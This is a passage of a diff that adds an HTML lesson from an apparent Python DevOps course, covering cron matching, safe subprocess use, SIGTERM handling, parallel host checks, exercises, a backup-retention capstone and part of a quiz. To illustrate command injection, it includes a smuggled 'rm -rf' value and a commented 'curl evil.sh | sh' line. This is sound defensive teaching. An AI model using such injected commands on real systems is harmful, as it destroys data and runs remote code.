+        <span class="kw">return</span> dom_ok <span class="kw">or</span> dow_ok                           <span class="cm"># BOTH restricted =&gt; OR, not AND (classic cron gotcha)</span>
+    <span class="kw">return</span> dom_ok <span class="kw">and</span> dow_ok
+
+cases = [
+    (<span class="st">'*/5 * * * *'</span>,   datetime(<span class="nm">2025</span>, <span class="nm">3</span>, <span class="nm">17</span>, <span class="nm">12</span>, <span class="nm">0</span>)),    <span class="cm"># every 5 minutes</span>
+    (<span class="st">'*/5 * * * *'</span>,   datetime(<span class="nm">2025</span>, <span class="nm">3</span>, <span class="nm">17</span>, <span class="nm">12</span>, <span class="nm">3</span>)),
+    (<span class="st">'0 2 * * 1-5'</span>,   datetime(<span class="nm">2025</span>, <span class="nm">3</span>, <span class="nm">17</span>, <span class="nm">2</span>, <span class="nm">0</span>)),     <span class="cm"># Monday 02:00</span>
+    (<span class="st">'0 2 * * 1-5'</span>,   datetime(<span class="nm">2025</span>, <span class="nm">3</span>, <span class="nm">16</span>, <span class="nm">2</span>, <span class="nm">0</span>)),     <span class="cm"># Sunday 02:00</span>
+    (<span class="st">'0 0 13 * 5'</span>,    datetime(<span class="nm">2025</span>, <span class="nm">6</span>, <span class="nm">6</span>, <span class="nm">0</span>, <span class="nm">0</span>)),      <span class="cm"># a Friday that is NOT the 13th</span>
+    (<span class="st">'0 0 13 * 5'</span>,    datetime(<span class="nm">2025</span>, <span class="nm">6</span>, <span class="nm">10</span>, <span class="nm">0</span>, <span class="nm">0</span>)),     <span class="cm"># a Tuesday that is not the 13th</span>
+]
+<span class="kw">for</span> expr, dt <span class="kw">in</span> cases:
+    <span class="bi">print</span>(<span class="st">f'{expr:&lt;14} {dt:%a %Y-%m-%d %H:%M} -&gt; {cron_matches(expr, dt)}'</span>)</div>
+  </div>
+  <div class="info-box warn"><div class="ib-icon">⚠️</div><div class="ib-body"><strong>Read the fifth and sixth lines again.</strong> <code>0 0 13 * 5</code> reads like "midnight on Friday the 13th," but it fires on <em>every Friday and on every 13th</em> — the OR rule. Other operational traps: cron uses the server's <em>local</em> time zone (a 02:30 job vanishes or runs twice around a DST change — prefer UTC servers), a job that runs longer than its interval overlaps with itself (that's what the lock from 3.6 is for), and a missed run (machine was down) is simply skipped, not caught up.</div></div>
+
+  <!-- 3.9 -->
+  <div class="lesson-h2">3.9 — Running Other Programs Safely: subprocess, Signals and Parallel Host Checks</div>
+  <p class="lesson-p">Sooner or later a script has to call <code>git</code>, <code>kubectl</code>, <code>rsync</code> or <code>pg_dump</code>. <code>subprocess</code> needs a real operating system, so the real calls below are <strong>reference only</strong> in this browser sandbox — but the injection problem they defend against you can demonstrate right here with <code>shlex</code>. The rule is simple: <strong>pass an argument list, never a shell string built from input.</strong></p>
+  <div class="code-block">
+    <div class="cb-header"><span class="cb-label">What a shell would do with unsanitized input</span><button class="cb-run" onclick="runToConsole(this)">▶ Run</button></div>
+    <div class="cb-code"><span class="kw">import</span> shlex
+
+user_input = <span class="st">'backup.tar.gz; rm -rf /tmp/important'</span>
+
+unsafe = <span class="st">f'ls -l {user_input}'</span>
+<span class="bi">print</span>(<span class="st">'shell=True would run :'</span>, unsafe)
+<span class="bi">print</span>(<span class="st">'...parsed as         :'</span>, shlex.split(unsafe))          <span class="cm"># two commands, not one</span>
+
+safe_string = <span class="st">f'ls -l {shlex.quote(user_input)}'</span>
+<span class="bi">print</span>(<span class="st">'with shlex.quote     :'</span>, safe_string)
+<span class="bi">print</span>(<span class="st">'...parsed as         :'</span>, shlex.split(safe_string))     <span class="cm"># one filename argument</span>
+
+<span class="bi">print</span>(<span class="st">'best: an argv list   :'</span>, [<span class="st">'ls'</span>, <span class="st">'-l'</span>, user_input])     <span class="cm"># no shell involved at all</span></div>
+  </div>
+  <div class="info-box warn"><div class="ib-icon">🎬</div><div class="ib-body"><strong>Reference code — no Run button.</strong> The blocks below use real processes, signals and threads, which the browser's WebAssembly sandbox cannot provide. Run them in a terminal on a Linux box or in Colab; the patterns are what interviewers ask about.</div></div>
+  <div class="code-block">
+    <div class="cb-header"><span class="cb-label">Safe subprocess pattern: list argv, check, timeout, capture — reference only</span></div>
+    <div class="cb-code"><span class="kw">import</span> subprocess
+
+<span class="kw">def</span> <span class="fn">git_status</span>(repo):
+    <span class="kw">try</span>:
+        result = subprocess.run(
+            [<span class="st">"git"</span>, <span class="st">"status"</span>, <span class="st">"--porcelain"</span>],      <span class="cm"># list: no shell, no injection</span>
+            cwd=repo,
+            check=<span class="kw">True</span>,                            <span class="cm"># non-zero exit -&gt; CalledProcessError</span>
+            capture_output=<span class="kw">True</span>, text=<span class="kw">True</span>,
+            timeout=<span class="nm">30</span>,                            <span class="cm"># never let a hung child hang you</span>
+        )
+    <span class="kw">except</span> subprocess.TimeoutExpired:
+        <span class="kw">raise</span> RuntimeError(<span class="st">"git status timed out"</span>)
+    <span class="kw">except</span> subprocess.CalledProcessError <span class="kw">as</span> e:
+        <span class="kw">raise</span> RuntimeError(<span class="st">f"git failed ({e.returncode}): {e.stderr.strip()}"</span>)
+    <span class="kw">return</span> result.stdout.splitlines()
+
+<span class="cm"># DANGEROUS: shell=True with interpolated input</span>
+<span class="cm">#   subprocess.run(f"grep {pattern} app.log", shell=True)</span>
+<span class="cm"># pattern = "x; curl evil.sh | sh"  -&gt;  arbitrary command execution as the script's user</span></div>
+  </div>
+  <div class="code-block">
+    <div class="cb-header"><span class="cb-label">Graceful shutdown: handle SIGTERM, finish the current unit of work — reference only</span></div>
+    <div class="cb-code"><span class="kw">import</span> signal, time
+
+stop = <span class="kw">False</span>
+
+<span class="kw">def</span> <span class="fn">handle_sigterm</span>(signum, frame):
+    <span class="kw">global</span> stop
+    stop = <span class="kw">True</span>                                    <span class="cm"># set a flag; do NOT do heavy work in the handler</span>
+
+signal.signal(signal.SIGTERM, handle_sigterm)      <span class="cm"># Kubernetes/systemd send SIGTERM first...</span>
+signal.signal(signal.SIGINT, handle_sigterm)       <span class="cm"># ...and Ctrl-C sends SIGINT</span>
+
+<span class="kw">while</span> <span class="kw">not</span> stop:
+    process_next_batch()                           <span class="cm"># finish whatever is in flight</span>
+    time.sleep(<span class="nm">1</span>)
+cleanup_and_exit()                                 <span class="cm"># release locks, flush logs, exit 0</span>
+<span class="cm"># Kubernetes then waits terminationGracePeriodSeconds (default 30s) and sends SIGKILL,</span>
+<span class="cm"># which cannot be caught.</span></div>
+  </div>
+  <div class="code-block">
+    <div class="cb-header"><span class="cb-label">Checking many hosts in parallel with a thread pool — reference only</span></div>
+    <div class="cb-code"><span class="kw">from</span> concurrent.futures <span class="kw">import</span> ThreadPoolExecutor, as_completed
+
+<span class="kw">def</span> <span class="fn">check</span>(host):
+    ...                                            <span class="cm"># I/O bound: ssh, HTTP health check, TCP connect</span>
+    <span class="kw">return</span> host, <span class="kw">True</span>
+
+hosts = [<span class="st">f"web{n:02d}.example.internal"</span> <span class="kw">for</span> n <span class="kw">in</span> <span class="bi">range</span>(<span class="nm">1</span>, <span class="nm">201</span>)]
+failed = []
+<span class="kw">with</span> ThreadPoolExecutor(max_workers=<span class="nm">20</span>) <span class="kw">as</span> pool:  <span class="cm"># bound the parallelism; don't open 200 sockets at once</span>
+    futures = [pool.submit(check, h) <span class="kw">for</span> h <span class="kw">in</span> hosts]
+    <span class="kw">for</span> fut <span class="kw">in</span> as_completed(futures, timeout=<span class="nm">120</span>):
+        <span class="kw">try</span>:
+            host, ok = fut.result()
+        <span class="kw">except</span> Exception <span class="kw">as</span> exc:
+            failed.append(<span class="bi">str</span>(exc))
+        <span class="kw">else</span>:
+            <span class="kw">if</span> <span class="kw">not</span> ok:
+                failed.append(host)
+<span class="bi">print</span>(<span class="st">f"{len(failed)} unhealthy"</span>)</div>
+  </div>
+  <div class="info-box note"><div class="ib-icon">💡</div><div class="ib-body"><strong>Threads vs processes vs asyncio for ops work.</strong> Checking hosts, calling APIs and waiting on SSH are <em>I/O bound</em>: the GIL is released while a thread waits on a socket, so a thread pool (or asyncio) gives near-linear speed-ups. Compressing or hashing lots of data is <em>CPU bound</em>: threads don't help under the GIL, use <code>ProcessPoolExecutor</code>. And always reap what you start: a child launched with <code>Popen</code> that is never <code>wait()</code>ed becomes a <strong>zombie</strong> — dead, but still holding a process-table entry until its parent collects the exit status.</div></div>
+
+  <div class="lesson-h2">DevOps 3 Summary</div>
+  <ul class="step-list">
+    <li data-n="1"><div><strong>Test on a throwaway tree, and guard every delete</strong> — resolve paths and check they sit inside the allowed root before removing anything.</div></li>
+    <li data-n="2"><div><strong>Separate the plan from the action.</strong> A pure planner with an injected <code>now</code> gives you dry-runs, deterministic tests and replayable history.</div></li>
+    <li data-n="3"><div><strong>Retention = age rule OR newest-K rule.</strong> The count rule stops a broken backup job from causing a total wipe.</div></li>
+    <li data-n="4"><div><strong>Retry transient errors only, with bounded attempts, exponential backoff, a cap and jitter</strong> — and only for operations that are safe to repeat.</div></li>
+    <li data-n="5"><div><strong>Idempotent, atomic, locked:</strong> declare end state, write temp-then-<code>os.replace</code>, and serialize runs with an exclusive lock that is always released.</div></li>
+    <li data-n="6"><div><strong>Exit codes are the API to your scheduler;</strong> structured logs are the API to your log platform. Return codes from <code>main()</code>, log JSON, never log secrets.</div></li>
+    <li data-n="7"><div><strong>Cron has sharp edges:</strong> Sunday is 0 (or 7), day-of-month and day-of-week combine with OR, and schedules run in server-local time.</div></li>
+    <li data-n="8"><div><strong>Never build shell strings from input.</strong> Use argument lists, timeouts and <code>check=True</code>; handle SIGTERM; reap child processes.</div></li>
+  </ul>
+
+  <div style="display:flex;gap:12px;margin-top:28px">
+    <button class="next-btn" onclick="showSection('practice')">✏️ Go to Practice Exercises →</button>
+  </div>
+</div><!-- end lesson -->
+
+<div class="practice-section" id="sec-practice">
+  <div class="practice-intro">
+    <h2>✏️ Practice Exercises</h2>
+    <p>5 exercises. Inputs are fixed so your printed output can be checked precisely. Every exercise runs real <code>pathlib</code>, <code>hashlib</code>, <code>datetime</code> and <code>re</code> code in the browser.</p>
+  </div>
+
+  <div class="exercise" id="ex1">
+    <div class="ex-header">
+      <div class="ex-num">1</div>
+      <div class="ex-meta">
+        <span class="ex-diff diff-easy">Easy</span>
+        <div class="ex-title">Disk-Usage Report</div>
+        <div class="ex-desc">Total bytes per top-level entry, largest first, with a human-readable size.</div>
+      </div>
+    </div>
+    <div class="ex-task">Task:
+The tree below is built for you. Using rglob, is_file and relative_to(root).parts[0],
+add up the bytes under each TOP-LEVEL entry (a loose file such as README counts as its own entry).
+
+Print the entries largest first as   f'{name:&lt;8}{human(size):&gt;10}'
+then a final total line              f'{"TOTAL":&lt;8}{human(total):&gt;10}'
+(human() is provided.)</div>
+    <div class="ex-editor-wrap">
+      <textarea class="ex-editor" id="ex1-code">import os, tempfile
+from pathlib import Path
+
+def make_tree(root, spec):
+    for rel, (data, mtime) in spec.items():
+        p = root / rel
+        p.parent.mkdir(parents=True, exist_ok=True)
+        p.write_bytes(data)
+        os.utime(p, (mtime, mtime))
+
+def human(n):
+    for unit in ('B', 'KB', 'MB'):
+        if n &lt; 1024 or unit == 'MB':
+            return f'{n} B' if unit == 'B' else f'{n:.1f} {unit}'
+        n /= 1024
+
+root = Path(tempfile.mkdtemp())
+make_tree(root, {
+    'logs/app.log':     (b'a' * 3000, 0),
+    'logs/app.log.1':   (b'a' * 2500000, 0),
+    'cache/thumbs.bin': (b'b' * 900000, 0),
+    'cache/idx.bin':    (b'b' * 48000, 0),
+    'etc/app.yaml':     (b'c' * 700, 0),
+    'README':           (b'd' * 120, 0),
+})
+
+# TODO: add up the bytes under each TOP-LEVEL entry of root
+#       ('logs', 'cache', 'etc', and the loose file 'README').
+#       Then print them largest first as   f'{name:&lt;8}{human(size):&gt;10}'
+#       and finish with a total line       f'{"TOTAL":&lt;8}{human(total):&gt;10}'
+</textarea>
+      <div class="ex-btn-row">
+        <button class="ex-run" onclick="runExercise(1)">▶ Run &amp; Check</button>
+        <button class="ex-hint" onclick="showExHint(1)">💡 Hint</button>
+        <button class="ex-reset" onclick="resetEx(1)">↺ Reset</button>
+        <button class="ex-solution" onclick="showSolution(1)">👁 Solution</button>
+      </div>
+      <div class="ex-output" id="ex1-out"></div>
+      <div class="ex-result" id="ex1-result"></div>
+    </div>
+  </div>
+
+  <div class="exercise" id="ex2">
+    <div class="ex-header">
+      <div class="ex-num">2</div>
+      <div class="ex-meta">
+        <span class="ex-diff diff-medium">Medium</span>
+        <div class="ex-title">Duplicate File Finder</div>
+        <div class="ex-desc">Group by size first, hash only the candidates, report reclaimable space.</div>
+      </div>
+    </div>
+    <div class="ex-task">Task:
+A tree with copies and one near-miss (other.jpg has the same size as photo.jpg but different content) is built for you.
+Find files with identical CONTENT the efficient way: group by size first, then SHA-256 (in chunks)
+only the files that share a size with at least one other file.
+
+Print each duplicate group (paths relative to root, sorted inside the group, groups ordered by first path):
+  f'Group {i}: {group}'        (i starts at 1)
+then:
+  f'Files hashed: {hashed} of 7'
+  f'Reclaimable bytes: {reclaimable}'   (bytes freed by keeping ONE copy of each group)</div>
+    <div class="ex-editor-wrap">
+      <textarea class="ex-editor" id="ex2-code">import hashlib, os, tempfile
+from pathlib import Path
+
+def make_tree(root, spec):
+    for rel, (data, mtime) in spec.items():
+        p = root / rel
+        p.parent.mkdir(parents=True, exist_ok=True)
+        p.write_bytes(data)
+        os.utime(p, (mtime, mtime))
+
+root = Path(tempfile.mkdtemp())
+make_tree(root, {
+    'a/report.pdf':        (b'PDF-CONTENT-1' * 100, 0),
+    'b/report-copy.pdf':   (b'PDF-CONTENT-1' * 100, 0),
+    'c/notes.txt':         (b'meeting notes', 0),
+    'a/photo.jpg':         (b'JPEGDATA' * 200, 0),
+    'b/photo (1).jpg':     (b'JPEGDATA' * 200, 0),
+    'c/photo-final.jpg':   (b'JPEGDATA' * 200, 0),
+    'c/other.jpg':         (b'JPEGDATB' * 200, 0),
+})
+
+# TODO 1: group files by SIZE first (a unique size can never be a duplicate).
+# TODO 2: only for sizes shared by 2+ files, compute a SHA-256 (read in chunks) and group by hash.
+# TODO 3: print each duplicate group (paths relative to root, sorted) as  f'Group {i}: {group}'
+#         with groups ordered by their first path, then:
+#         f'Files hashed: {hashed} of 7'   and   f'Reclaimable bytes: {reclaimable}'
+#         (reclaimable = bytes you would free by keeping one copy of each group)
+</textarea>
+      <div class="ex-btn-row">
+        <button class="ex-run" onclick="runExercise(2)">▶ Run &amp; Check</button>
+        <button class="ex-hint" onclick="showExHint(2)">💡 Hint</button>
+        <button class="ex-reset" onclick="resetEx(2)">↺ Reset</button>
+        <button class="ex-solution" onclick="showSolution(2)">👁 Solution</button>
+      </div>
+      <div class="ex-output" id="ex2-out"></div>
+      <div class="ex-result" id="ex2-result"></div>
+    </div>
+  </div>
+
+  <div class="exercise" id="ex3">
+    <div class="ex-header">
+      <div class="ex-num">3</div>
+      <div class="ex-meta">
+        <span class="ex-diff diff-medium">Medium</span>
+        <div class="ex-title">Retention Policy Planner</div>
+        <div class="ex-desc">Keep the newest K or anything younger than N days; survive a stalled backup job.</div>
+      </div>
+    </div>
+    <div class="ex-task">Task:
+Write plan_retention(files, now, keep_days, keep_last) -&gt; (keep, delete), both lists NEWEST FIRST.
+A file is kept if it is among the newest keep_last files OR its date is on/after now - keep_days.
+The date comes from the file name (app-YYYY-MM-DD.tar.gz) — parse it with re + datetime.strptime, UTC midnight.
+
+Print, using the given names / stalled lists with KEEP_DAYS and KEEP_LAST:
+  f'Keep  : {keep}'
+  f'Delete: {delete}'
+  f'Stalled keep  : {keep}'
+  f'Stalled delete: {delete}'
+The stalled list is every backup older than the age cut-off: the count rule must save the newest two.</div>
+    <div class="ex-editor-wrap">
+      <textarea class="ex-editor" id="ex3-code">import re
+from datetime import datetime, timedelta, timezone
+
+NOW = datetime(2025, 3, 15, 12, 0, tzinfo=timezone.utc)
+KEEP_DAYS, KEEP_LAST = 10, 2
+
+names = ['app-2025-03-14.tar.gz', 'app-2025-03-01.tar.gz', 'app-2025-02-28.tar.gz',
+         'app-2025-03-10.tar.gz', 'app-2025-01-15.tar.gz', 'app-2025-03-13.tar.gz',
+         'app-2024-12-25.tar.gz']
+stalled = ['app-2025-01-10.tar.gz', 'app-2025-01-09.tar.gz', 'app-2025-01-08.tar.gz',
+           'app-2024-12-01.tar.gz']
+
+# TODO: write plan_retention(files, now, keep_days, keep_last) -&gt; (keep, delete)
+#   - parse the date out of each file name (re + datetime.strptime)
+#   - a file is KEPT if it is among the newest keep_last files OR is newer than now - keep_days
+#   - both lists newest first
+# Then print, for `names` and then for `stalled`, exactly:
+#   f'Keep  : {keep}'          f'Delete: {delete}'
+#   f'Stalled keep  : {keep}'  f'Stalled delete: {delete}'
+</textarea>
+      <div class="ex-btn-row">
+        <button class="ex-run" onclick="runExercise(3)">▶ Run &amp; Check</button>
+        <button class="ex-hint" onclick="showExHint(3)">💡 Hint</button>
+        <button class="ex-reset" onclick="resetEx(3)">↺ Reset</button>
+        <button class="ex-solution" onclick="showSolution(3)">👁 Solution</button>
+      </div>
+      <div class="ex-output" id="ex3-out"></div>
+      <div class="ex-result" id="ex3-result"></div>
+    </div>
+  </div>
+
+  <div class="exercise" id="ex4">
+    <div class="ex-header">
+      <div class="ex-num">4</div>
+      <div class="ex-meta">
+        <span class="ex-diff diff-hard">Hard</span>
+        <div class="ex-title">Retry With Exponential Backoff</div>
+        <div class="ex-desc">Implement the decorator so three scenarios produce an exact delay schedule.</div>
+      </div>
+    </div>
+    <div class="ex-task">Task:
+Implement retry(max_attempts, base_delay, factor, max_delay, jitter, sleep, retry_on) as a decorator factory.
+  - only exceptions in retry_on are retried; any other exception propagates immediately
+  - before retry k (k = 0, 1, 2, ...) call sleep(jitter(min(max_delay, base_delay * factor ** k)))
+  - if the last attempt fails, re-raise that exception WITHOUT sleeping again
+  - the default jitter is the identity (jitter=lambda cap: cap), so delays are exact
+The scenarios are provided; your output must be exactly:
+  Scenario 1: result=ok calls=3 delays=[0.5, 1.0]
+  Scenario 2: ConnectionError after 5 attempts, delays=[0.5, 1.0, 2.0, 3.0]
+  Scenario 3: ValueError not retried, calls=1, delays=[]</div>
+    <div class="ex-editor-wrap">
+      <textarea class="ex-editor" id="ex4-code">import functools, time
+
+def retry(max_attempts=4, base_delay=1.0, factor=2.0, max_delay=30.0,
+          jitter=lambda cap: cap, sleep=None, retry_on=(ConnectionError, TimeoutError)):
+    # TODO: return a decorator that calls the function up to max_attempts times.
+    #   - only exceptions in retry_on are retried; anything else propagates immediately
+    #   - before retry number k (k = 0, 1, 2 ...) sleep jitter(min(max_delay, base_delay * factor ** k))
+    #   - if the LAST attempt fails, re-raise that exception (do not sleep after it)
+    #   - use `sleep or time.sleep` so tests can inject a recorder
+    raise NotImplementedError
+
+def run_scenarios(retry):
+    delays, calls = [], {'n': 0}
+
+    @retry(max_attempts=4, base_delay=0.5, factor=2.0, max_delay=3.0, sleep=delays.append)
+    def flaky():
+        calls['n'] += 1
+        if calls['n'] &lt; 3:
+            raise ConnectionError('reset')
+        return 'ok'
+    print(f'Scenario 1: result={flaky()} calls={calls["n"]} delays={delays}')
+
+    delays2, calls2 = [], {'n': 0}
+
+    @retry(max_attempts=5, base_delay=0.5, factor=2.0, max_delay=3.0, sleep=delays2.append)
+    def always_down():
+        calls2['n'] += 1
+        raise ConnectionError('still down')
+    try:
+        always_down()
+    except ConnectionError as e:
+        print(f'Scenario 2: {type(e).__name__} after {calls2["n"]} attempts, delays={delays2}')
+
+    delays3, calls3 = [], {'n': 0}
+
+    @retry(max_attempts=5, sleep=delays3.append)
+    def bad_request():
+        calls3['n'] += 1
+        raise ValueError('bad payload')
+    try:
+        bad_request()
+    except ValueError as e:
+        print(f'Scenario 3: {type(e).__name__} not retried, calls={calls3["n"]}, delays={delays3}')
+
+run_scenarios(retry)
+</textarea>
+      <div class="ex-btn-row">
+        <button class="ex-run" onclick="runExercise(4)">▶ Run &amp; Check</button>
+        <button class="ex-hint" onclick="showExHint(4)">💡 Hint</button>
+        <button class="ex-reset" onclick="resetEx(4)">↺ Reset</button>
+        <button class="ex-solution" onclick="showSolution(4)">👁 Solution</button>
+      </div>
+      <div class="ex-output" id="ex4-out"></div>
+      <div class="ex-result" id="ex4-result"></div>
+    </div>
+  </div>
+
+  <div class="exercise" id="ex5">
+    <div class="ex-header">
+      <div class="ex-num">5</div>
+      <div class="ex-meta">
+        <span class="ex-diff diff-hard">Hard</span>
+        <div class="ex-title">Cron Expression Matcher</div>
+        <div class="ex-desc">Sunday = 0 or 7, and day-of-month OR day-of-week when both are restricted.</div>
+      </div>
+    </div>
+    <div class="ex-task">Task:
+field_matches() is provided (it handles *, lists, ranges and steps). Implement cron_matches(expr, dt):
+  - minute, hour and month fields must all match
+  - cron day-of-week: Sunday = 0 (7 also means Sunday); Python's dt.weekday() has Monday = 0
+  - if BOTH day-of-month and day-of-week are restricted (neither is '*'), the day matches when EITHER does
+  - otherwise both must match ('*' matches anything)
+The loop that prints the results is provided; your output must be the 7 result lines.</div>
+    <div class="ex-editor-wrap">
+      <textarea class="ex-editor" id="ex5-code">from datetime import datetime
+
+def field_matches(field, value, lo, hi):
+    for part in field.split(','):
+        step, has_step = 1, '/' in part
+        if has_step:
+            part, step = part.split('/')
+            step = int(step)
+        if part == '*':
+            start, end = lo, hi
+        elif '-' in part:
+            start, end = map(int, part.split('-'))
+        else:
+            start = int(part)
+            end = hi if has_step else start        # "5/20" means 5-hi every 20
+        if start &lt;= value &lt;= end and (value - start) % step == 0:
+            return True
+    return False
+
+def cron_matches(expr, dt):
+    # TODO: split expr into minute, hour, dom, month, dow
+    #   - minute, hour and month must all match (use field_matches with lo/hi 0-59, 0-23, 1-12)
+    #   - cron day-of-week: Sunday = 0 (and 7 also means Sunday); Python's dt.weekday() has Monday = 0
+    #   - if BOTH dom and dow are restricted (neither is '*'), the day matches when EITHER matches
+    #   - otherwise BOTH must match ('*' always matches)
+    raise NotImplementedError
+
+cases = [
+    ('*/15 9-17 * * 1-5', datetime(2025, 3, 17, 9, 45)),
+    ('*/15 9-17 * * 1-5', datetime(2025, 3, 15, 9, 45)),
+    ('0 3 * * 0',         datetime(2025, 3, 16, 3, 0)),
+    ('0 3 * * 7',         datetime(2025, 3, 16, 3, 0)),
+    ('0 0 13 * 5',        datetime(2025, 6, 6, 0, 0)),
+    ('5/20 * * * *',      datetime(2025, 3, 17, 10, 45)),
+    ('5/20 * * * *',      datetime(2025, 3, 17, 10, 15)),
+]
+for expr, dt in cases:
+    print(f'{expr:&lt;18} {dt:%a %Y-%m-%d %H:%M} -&gt; {cron_matches(expr, dt)}')
+</textarea>
+      <div class="ex-btn-row">
+        <button class="ex-run" onclick="runExercise(5)">▶ Run &amp; Check</button>
+        <button class="ex-hint" onclick="showExHint(5)">💡 Hint</button>
+        <button class="ex-reset" onclick="resetEx(5)">↺ Reset</button>
+        <button class="ex-solution" onclick="showSolution(5)">👁 Solution</button>
+      </div>
+      <div class="ex-output" id="ex5-out"></div>
+      <div class="ex-result" id="ex5-result"></div>
+    </div>
+  </div>
+
+</div><!-- end practice -->
+
+<div class="project-section" id="sec-project">
+  <div class="project-banner">
+    <h2>🏗️ Capstone: <span>BackupJanitor</span></h2>
+    <p>Every team has a directory of dated backups and a cron job that is supposed to clean it up. Build the version you would be comfortable running unattended in production: it recognizes only files it understands, applies retention per backup series, defaults to a dry-run, refuses a dangerous policy, and is idempotent — running it twice never does anything the first run didn't already do.</p>
+    <div class="project-tags">
+      <span class="ptag">retention</span>
+      <span class="ptag">dry-run</span>
+      <span class="ptag">idempotent</span>
+      <span class="ptag">safe deletion</span>
+    </div>
+  </div>
+
+  <div class="project-spec">
+    <h3>📋 What to Build</h3>
+    <ul class="spec-list">
+      <li>A BackupJanitor class for files named <code>series-YYYY-MM-DD.tar.gz</code> (series = lowercase letters, e.g. <code>db</code>, <code>files</code>)</li>
+      <li>The constructor raises <code>ValueError</code> if <code>keep_last &lt; 1</code> — a policy that can delete the last good backup is refused outright</li>
+      <li><code>scan()</code> groups recognized files by series and records everything else in <code>self.skipped</code> (README.txt must never be touched)</li>
+      <li><code>plan()</code> applies the retention rule <em>per series</em>: keep the newest <code>keep_last</code> plus anything newer than <code>now - keep_days</code>; returns the sorted names to delete</li>
+      <li><code>run()</code> prints <code>Nothing to do</code> when the plan is empty; otherwise a dry run prints <code>DRY RUN would delete NAME</code> and a real run deletes the file and prints <code>Deleted NAME</code>; returns the list</li>
+      <li>The harness runs it dry twice (identical), then for real, then for real again (nothing left to do)</li>
+    </ul>
+  </div>
+
+  <div class="project-editor">
+    <div class="pe-header">
+      <div class="pe-title">🏗️ BackupJanitor — Your Solution</div>
+      <button class="pe-run" onclick="runProject()">▶ Run Project</button>
+    </div>
+    <textarea id="project-editor">import re
+from datetime import datetime, timedelta
+
+class BackupJanitor:
+    """Retention for dated backups like  db-2025-03-14.tar.gz  /  files-2025-02-01.tar.gz"""
+    PATTERN = re.compile(r'^(?P&lt;series&gt;[a-z]+)-(?P&lt;date&gt;\d{4}-\d{2}-\d{2})\.tar\.gz$')
+
+    def __init__(self, root, now, keep_days, keep_last, dry_run=True):
+        # TODO 1: refuse keep_last &lt; 1 with ValueError('keep_last must be &gt;= 1 (never delete the last good backup)')
+        #         store the arguments; start self.skipped = []
+        raise NotImplementedError
+
+    def scan(self):
+        # TODO 2: return {series: [(datetime, filename), ...]} for files matching PATTERN.
+        #         Anything that does not match goes in self.skipped (never delete unknown files).
+        raise NotImplementedError
+
+    def plan(self):
+        # TODO 3: per SERIES (db and files are independent), keep the newest keep_last files
+        #         plus anything newer than now - keep_days. Return the sorted list of names to delete.
+        raise NotImplementedError
+
+    def run(self):
+        # TODO 4: doomed = self.plan(). If empty print 'Nothing to do' and return [].
+        #         Otherwise for each name: dry run prints  f'DRY RUN would delete {name}',
+        #         a real run unlinks the file and prints   f'Deleted {name}'. Return the list.
+        raise NotImplementedError
+
+# ---- harness (do not change) ------------------------------------------------
+import tempfile
+from pathlib import Path
+from datetime import datetime, timezone
+
+NOW = datetime(2025, 3, 15, 12, 0, tzinfo=timezone.utc)
+root = Path(tempfile.mkdtemp())
+for name in ['db-2025-03-14.tar.gz', 'db-2025-03-13.tar.gz', 'db-2025-03-12.tar.gz',
+             'db-2025-03-01.tar.gz', 'db-2025-02-14.tar.gz', 'db-2025-01-30.tar.gz',
+             'files-2025-03-14.tar.gz', 'files-2025-02-01.tar.gz', 'files-2025-01-15.tar.gz',
+             'files-2024-12-01.tar.gz', 'README.txt']:
+    (root / name).write_text('x')
+
+try:
+    BackupJanitor(root, NOW, keep_days=7, keep_last=0)
+except ValueError as e:
+    print('Guard:', e)
+
+dry = BackupJanitor(root, NOW, keep_days=7, keep_last=2, dry_run=True)
+first = dry.run()
+second = dry.run()
+print('Dry runs identical:', first == second)
+print('Nothing deleted yet:', len(list(root.iterdir())) == 11)
+
+real = BackupJanitor(root, NOW, keep_days=7, keep_last=2, dry_run=False)
+deleted = real.run()
+print('Deleted:', len(deleted))
+again = real.run()
+print('Second real run deleted:', len(again))
+print('Remaining:', sorted(p.name for p in root.iterdir()))
+print('Skipped:', real.skipped)
+</textarea>
+    <div class="pe-output" id="project-output">Your output will appear here when you click Run...</div>
+    <div class="pe-result" id="project-result"></div>
+  </div>
+
+  <div class="checklist">
+    <h3>✅ Capstone Checklist — did your output include?</h3>
+    <div class="check-item"><span class="check-icon">🛡️</span>Guard: keep_last must be &gt;= 1 (the dangerous policy is refused)</div>
+    <div class="check-item"><span class="check-icon">🔍</span>DRY RUN lines for the 3 old db files and 2 old files-series backups — and no deletions yet</div>
+    <div class="check-item"><span class="check-icon">♻️</span>Dry runs identical: True (planning has no side effects)</div>
+    <div class="check-item"><span class="check-icon">🗑️</span>Deleted: 5, then a second real run prints Nothing to do (idempotent)</div>
+    <div class="check-item"><span class="check-icon">📁</span>README.txt untouched and reported as skipped; the newest backups of each series survive</div>
+  </div>
+
+  <div style="display:flex;gap:12px;margin-top:8px">
+    <button class="next-btn" onclick="showSection('quiz')">🧪 Go to Quiz →</button>
+  </div>
+</div><!-- end project -->
+
+<div class="quiz-section" id="sec-quiz">
+  <div class="quiz-banner">
+    <h2>🧪 DevOps 3 Quiz</h2>
+    <p>5 questions. You need 4/5 (80%) to pass. You can retake this as many times as you want — nothing is saved across page loads.</p>
+    <div class="quiz-score" id="quiz-score-display" style="display:none">Score: <span id="quiz-score">0</span>/5</div>
+  </div>
+
+  <div class="quiz-card">
+    <div class="q-num">Question 1 of 5</div>
+    <div class="q-text">A nightly script calls <code>POST /invoices</code> and sometimes gets a timeout with no response. A teammate wraps the call in <code>@retry(max_attempts=5)</code>. What is the real risk?</div>
+    <div class="q-options" id="q1-opts">
+      <button class="q-opt" onclick="selectOpt(1,'A')"><span class="q-opt-letter">A</span> None — a retry decorator always makes a call more reliable</button>
+      <button class="q-opt" onclick="selectOpt(1,'B')"><span class="q-opt-letter">B</span> The request may have succeeded before the timeout, so retrying a non-idempotent POST can create duplicate invoices — retry only idempotent operations, or send an idempotency key</button>
+      <button class="q-opt" onclick="selectOpt(1,'C')"><span class="q-opt-letter">C</span> Retry decorators cannot wrap functions that make network calls</button>
+      <button class="q-opt" onclick="selectOpt(1,'D')"><span class="q-opt-letter">D</span> Timeouts are never transient, so the retries are simply wasted</button>
+    </div>
+  </div>
+
+  <div class="quiz-card">
+    <div class="q-num">Question 2 of 5</div>
+    <div class="q-text">1,000 workers all fail at the same instant and each retries after exactly 1s, then 2s, then 4s. What does adding random <em>jitter</em> fix?</div>
+    <div class="q-options" id="q2-opts">
+      <button class="q-opt" onclick="selectOpt(2,'A')"><span class="q-opt-letter">A</span> It makes every retry succeed faster on average</button>
